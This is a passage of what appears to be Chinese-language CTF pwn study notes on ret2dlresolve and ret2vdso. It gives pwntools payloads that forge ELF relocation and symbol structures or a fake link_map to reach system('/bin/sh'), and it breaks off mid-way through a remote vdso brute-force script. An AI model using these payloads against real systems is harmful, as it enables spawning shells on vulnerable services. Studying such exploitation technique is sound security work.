<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 先进行栈迁移, 调用read向fake_ebp读入rop数据</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>padding</span> <span class=o>+</span> <span class=n>fake_ebp_addr</span> <span class=o>+</span> <span class=n>read</span><span class=nd>@plt</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>leave_ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_ebp_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>100</span><span class=p>)</span></span></span></code></pre></div></div><p>利用：</p><img src=/img/pwn_note.zh-cn.assets/image-20241110161157056.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>func_name</span> <span class=o>=</span> <span class=s2>&#34;system&#34;</span>
</span></span><span class=line><span class=cl><span class=n>func_args</span> <span class=o>=</span> <span class=s2>&#34;/bin/sh&#34;</span>
</span></span><span class=line><span class=cl><span class=n>resolve_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=p>[</span><span class=s1>&#39;sh_addr&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>JMPREL</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s1>&#39;DT_JMPREL&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>SYMTAB</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s1>&#39;DT_SYMTAB&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>STRTAB</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s1>&#39;DT_STRTAB&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake_rel_addr</span> <span class=o>=</span> <span class=n>rop_addr</span> <span class=o>+</span> <span class=mi>5</span> <span class=o>*</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=n>reloc_offset</span> <span class=o>=</span> <span class=n>fake_rel_addr</span> <span class=o>-</span> <span class=n>JMPREL</span> <span class=c1># 伪造参数指向fake Elf_Rel</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>rop_addr</span> <span class=o>+</span> <span class=mi>7</span> <span class=o>*</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=n>align</span> <span class=o>=</span> <span class=p>(</span><span class=mh>0x10</span> <span class=o>-</span> <span class=p>((</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>SYMTAB</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xF</span>
</span></span><span class=line><span class=cl><span class=n>fake_sym_addr</span> <span class=o>+=</span> <span class=n>align</span> <span class=c1># 通过r_info指向sym地址, 逆向获取r_info和fake_rel值</span>
</span></span><span class=line><span class=cl><span class=n>r_info</span> <span class=o>=</span> <span class=p>(((</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>SYMTAB</span><span class=p>)</span> <span class=o>//</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0x7</span>
</span></span><span class=line><span class=cl><span class=c1># 0x7 means that Assertion `ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT&#39;</span>
</span></span><span class=line><span class=cl><span class=n>fake_rel</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>r_info</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake_name_addr</span> <span class=o>=</span> <span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>*</span> <span class=mi>4</span> <span class=c1># 此处为system字符串位置</span>
</span></span><span class=line><span class=cl><span class=n>st_name</span> <span class=o>=</span> <span class=n>fake_name_addr</span> <span class=o>-</span> <span class=n>STRTAB</span> <span class=c1># 伪造st_name使其指向system</span>
</span></span><span class=line><span class=cl><span class=n>fake_sym</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>st_name</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># 最终伪造fake Elf_Sym</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># +3确保地址向上舍入到下一个 4 字节边界, &amp;~3清除值的最低两位, 保证结果为4的倍数</span>
</span></span><span class=line><span class=cl><span class=n>bin_sh_offset</span> <span class=o>=</span> <span class=p>(</span><span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=n>rop_addr</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>func_name</span><span class=p>)</span> <span class=o>+</span> <span class=mi>3</span><span class=p>)</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=n>rop_addr</span> <span class=o>+</span> <span class=n>bin_sh_offset</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># padding填充, 因为之后esp会指向fake_ebp+4</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>resolve_plt</span><span class=p>)</span> <span class=c1># 实际为_dl_runtime_resolve前一条指令地址</span>
</span></span><span class=line><span class=cl>    <span class=c1># push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804c004&gt; 参数1入栈</span>
</span></span><span class=line><span class=cl>    <span class=c1># jmp  dword ptr [0x804c008] &lt;_dl_runtime_resolve&gt; 跳转到resolve函数</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>reloc_offset</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># 目标函数system的返回地址, 用不到, 填充</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span> <span class=c1># 目标函数的参数1</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>fake_rel</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=n>align</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>fake_sym</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>func_name</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=n>bin_sh_offset</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>func_args</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span></span></span></code></pre></div></div><ol><li>栈迁移 read 读 rop 后跳转到<code>leave ret</code>地址，ebp 此时指向<code>fake_ebp</code>，执行后 esp 指向<code>fake_ebp+8</code>，rip 指向 resolve 前一条指令</li><li>push resolve 函数的第一个参数，且 esp 中已伪造第二个参数，跳转执行<code>_dl_runtime_resolve(link_map,reloc_arg)</code></li><li>进入后 call 执行<code>_dl_fixup</code>函数，最终调用 system 函数 getshell</li></ol><p><strong>64 位</strong></p><ul><li><p>选择<code>ELFW(ST_VISIBILITY) (sym->st_other)</code>不为 0 时的流程，此时计算目标函数地址为<code>l->l_addr+sym->st_value</code></p></li><li><p>需要知道 libc 版本，但可在不泄露 libc 基址情况下利用</p></li><li><p>关键：构造<code>fake_link_map</code></p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>n64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=mh>0x10000000000000000</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span> 	<span class=c1># 将负数转换为正数</span>
</span></span><span class=line><span class=cl><span class=n>fake_link_map_addr</span> <span class=o>=</span> <span class=mh>0x404000</span> <span class=o>+</span> <span class=mh>0x800</span>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=n>n64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake_link_map</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>offset</span><span class=p>)</span>  									<span class=c1># l_addr</span>
</span></span><span class=line><span class=cl><span class=n>fake_link_map</span> <span class=o>=</span> <span class=n>fake_link_map</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_link_map</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>())</span>  								<span class=c1># l_info[5]需要为可读写的内存, .dynstr</span>
</span></span><span class=line><span class=cl><span class=n>fake_link_map</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_link_map_addr</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>)</span>  				<span class=c1># l_info[6] Sym</span>
</span></span><span class=line><span class=cl><span class=n>fake_link_map</span> <span class=o>=</span> <span class=n>fake_link_map</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_link_map</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_link_map_addr</span> <span class=o>+</span> <span class=mh>0x110</span><span class=p>)</span>  				<span class=c1># l_info[23] Rel</span>
</span></span><span class=line><span class=cl><span class=n>fake_link_map</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span>  			<span class=c1># Elf64_Dyn &lt;-5</span>
</span></span><span class=line><span class=cl><span class=c1># - 8 使得前面的st_other大概率为非0</span>
</span></span><span class=line><span class=cl><span class=n>fake_link_map</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_link_map_addr</span> <span class=o>+</span> <span class=mh>0x120</span><span class=p>)</span>  		<span class=c1># Elf64_Dyn &lt;-6</span>
</span></span><span class=line><span class=cl><span class=n>fake_link_map</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>n64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span> <span class=o>-</span> <span class=n>offset</span><span class=p>))</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># Elf64_Rel &lt;-23</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20241110201338426.png alt=图片无法加载><p>一：先栈溢出构造 read 函数向 link_map 地址读入</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sh_addr</span> <span class=o>=</span> <span class=n>fake_link_map_addr</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>fake_link_map</span><span class=p>)</span> <span class=c1># /bin/sh字符串地址</span>
</span></span><span class=line><span class=cl><span class=n>resolve_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=n>padding</span> <span class=o>*</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;ret&#39;</span><span class=p>),</span> <span class=n>executable</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>())</span> <span class=c1># ebp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;pop rdi; ret&#39;</span><span class=p>),</span> <span class=n>executable</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;pop rsi; ret&#39;</span><span class=p>),</span> <span class=n>executable</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_link_map_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span> <span class=c1># rdx为数量可以直接用地址值</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;pop rdi; ret&#39;</span><span class=p>),</span> <span class=n>executable</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>sh_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>resolve_plt</span> <span class=o>+</span> <span class=mi>6</span><span class=p>)</span> <span class=c1># resolve@plt</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_link_map_addr</span><span class=p>)</span>  	<span class=c1># arg1: struct link_map *l</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  					<span class=c1># arg2: ElfW(Word) reloc_arg</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=n>payload1</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x200</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span></span></span></code></pre></div></div><p>二：read 读入<code>fake_link_map</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=n>fake_link_map</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span></span></span></code></pre></div></div><h3 id=ret2vdso>ret2vdso</h3><ul><li><code>int 0x80</code>慢，会出现大量用户态和内核态切换的开销</li><li>Intel 和 AMD 分别实现了 sysenter/sysexit 和 syscall/sysret 快速系统调用指令，不同处理器架构实现不同指令会出现兼容问题，所以 linux 在<code>vdso</code>中实现了<code>vsyscall</code>接口，具体选择由内核决定</li><li><code>ldd /bin/sh</code>可以发现<code>linux-vdso.so.1</code>动态文件 VDSO，</li></ul><p><strong>VDSO</strong></p><ul><li>Virtual Dynamically-linked Shared Object，其将内核态的调用映射到用户地址空间的库上，可以看做一个<code>.so</code>动态库链接文件</li><li>不同内核 vdso 内容不同，VDSO 中存在<code>syscall; ret</code>且随机化弱，对于 32 位系统有<code>1/256</code>概率命中</li><li>gdb vmmap 可查看地址</li></ul><blockquote><p><code>intel</code>为例：</p><ul><li><code>sysenter</code>：Ring3 用户代码调用 Ring0 的系统内核代码；<code>sysexit</code>：Ring0 系统代码返回用户空间</li><li>执行<code>sysenter</code>指令的系统必须满足<ol><li>目标 Ring0 代码段是平坦模式(Flat Mode)的 4GB 可读可执行的非一致代码段</li><li>目标 Ring0 堆栈段是平坦模式(Flat Mode)的 4GB 可读可写向上扩展的栈段</li></ol></li><li><code>sysenter</code>指令不一定成对，不会把<code>sysexit</code>所需返回地址压栈，<code>sysexit</code>返回的地址也不一定是<code>sysenter</code>指令下一个指令地址，<code>sysenter/sysexit</code>指令跳转通过特殊寄存器实现，且用<code>wrmsr</code>指令在 Ring0 中执行来设置寄存器，<code>edx, eax</code>分别设置指定设置值的高 32 位和低 32 位，ecx 指定填充的寄存器：<ul><li><strong>SYSENTER_CS_MSR[0x174]</strong>：指定要执行的 Ring0 代码的代码段选择符</li><li><strong>SYSENTER_EIP_MSR[0x176]</strong>：指定要执行的 Ring0 代码的起始地址</li><li><strong>SYSENTER_ESP_MSR[0x175]</strong>：指定要执行的 Ring0 代码的栈指针</li></ul></li><li><strong>特性</strong>：Ring0 和 Ring3 的代码段描述符、堆栈段描述符在全局描述符表 GDT 中顺序排列，即知道 SYSENTER_CS_MSR 指定的 RIng0 代码段描述符可推算 RIng0 堆栈段描述符及 Ring3 的代码段描述符和堆栈段描述符</li></ul><p><strong>Ring3 代码调用 sysenter，CPU</strong>：【调用前需要通过 wrmsr 指令已设置好 Ring0 代码信息】</p><ol><li>SYSENTER_CS_MSR 值装载到 cs 寄存器</li><li>SYSENTER_EIP_MSR 值装载到 eip 寄存器</li><li>SYSENTER_CS_MSR 值+8（Ring0 的堆栈段描述符）装载到 ss 寄存器</li><li>SYSENTER_ESP_MSR 值装载到 esp 寄存器</li><li>特权级切换为 Ring0</li><li>若 EFLAGS 寄存器的 VM 标志被置位，则清除该标志</li><li>执行指定 Ring0 代码</li></ol><p><strong>Ring0 代码执行完毕调用 sysexit 返回 RIng3，CPU</strong>：【调用前保证 edx，ecx 正确性】</p><ol><li>SYSENTER_CS_MSR 值+16（Ring3 的代码段描述符）装载到 cs 寄存器</li><li>edx 值装载到 eip 寄存器</li><li>SYSENTER_CS_MSR 值+24（Ring3 的堆栈段描述符）装载到 ss 寄存器</li><li>ecx 值装载到 esp 寄存器</li><li>特权级切换为 Ring3</li><li>继续执行 Ring3 代码</li></ol></blockquote><p><strong>AUXV 辅助向量</strong></p><ul><li><p><code>LD_SHOW_AUXV</code>环境变量通知程序加载器展示程序运行时的辅助向量（存放在栈上，附带传递给动态链接器的信息），要获取 VDSO 内存地址，先查询<code>AT_SYSINFO</code></p></li><li><p>栈底（栈最高地址）存放：<code>[argc][argv][envp][auxiliary][.ascii data for argv/envp]</code>，辅助向量是一系列<code>Elf32_auxv_t</code>结构，gdb auxv 可查看 AUXV 信息</p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nv>LD_SHOW_AUXV</span><span class=o>=</span><span class=m>1</span> elf <span class=c1># whoami/ls</span>
</span></span><span class=line><span class=cl>AT_SYSINFO_EHDR: 0x12345678 <span class=c1># vdso入口地址</span></span></span></code></pre></div></div><p><strong>获取 VDSO</strong></p><ul><li>爆破</li><li>泄露<ul><li>ld.so 中的<code>_libc_stack_end</code>找到 stack 真实地址，计算 ELF Auxiliary Vector Offset 取出<code>AT_SYSINFO_EHDR</code></li><li>ld.so 中的<code>_rtld_global_ro</code>某个偏移也有 VDSO 位置，gdb p 查看<code>_dl_auxv</code>, <code>_dl_vdso_xxx</code></li><li>开了 ASLR：x86 只有 1 字节随机，暴力破解；x64 开启了 PIE 有 11 字节随机，linux 3.18 2.2 后有 18 字节随机</li><li><code>gdb> dump binary memory local_vdso_x32.so start_add end_addr</code>取出 so 文件查看</li></ul></li></ul><p><strong>32 位</strong></p><p>爆破或 gdb dump 出 so 文件，file 为<code>LSB shared object</code>，IDA 查看 vdso.so 文件</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>00000560</span>                 <span class=n>public</span> <span class=n>__kernel_sigreturn</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>00000560</span> <span class=n>__kernel_sigreturn</span> <span class=n>proc</span> <span class=n>near</span>            <span class=p>;</span> <span class=n>DATA</span> <span class=nl>XREF</span><span class=p>:</span> <span class=nl>LOAD</span><span class=p>:</span><span class=mo>000001</span><span class=mi>90</span><span class=err>↑</span><span class=n>o</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>00000560</span>                 <span class=n>pop</span>     <span class=n>eax</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>00000561</span>                 <span class=n>mov</span>     <span class=n>eax</span><span class=p>,</span> <span class=mi>77</span><span class=n>h</span> <span class=p>;</span> <span class=sc>&#39;w&#39;</span>                          <span class=c1>// addr1: sigreturn系统调用
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>00000566</span>                 <span class=kt>int</span>     <span class=mi>80</span><span class=n>h</span>             <span class=p>;</span> <span class=n>LINUX</span> <span class=o>-</span> <span class=n>sys_sigreturn</span> <span class=c1>// addr2: eip设置为int 0x80
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>00000566</span> <span class=p>;</span> <span class=p>}</span> <span class=c1>// starts at 55F
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000056</span><span class=mi>8</span>                 <span class=n>nop</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000056</span><span class=mi>9</span>                 <span class=n>lea</span>     <span class=n>esi</span><span class=p>,</span> <span class=p>[</span><span class=n>esi</span><span class=o>+</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000056</span><span class=mi>9</span> <span class=n>__kernel_sigreturn</span> <span class=n>endp</span> <span class=p>;</span> <span class=n>sp</span><span class=o>-</span><span class=n>analysis</span> <span class=n>failed</span></span></span></code></pre></div></div><p><strong>远程爆破 vdso 脚本</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>RANGE_VDSO</span>  <span class=o>=</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0xf7ed0000</span><span class=p>,</span> <span class=mh>0xf7fd0000</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>while</span><span class=p>(</span><span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;x.x.x.x&#39;</span><span class=p>,</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>vdso_addr</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>RANGE_VDSO</span><span class=p>)</span>
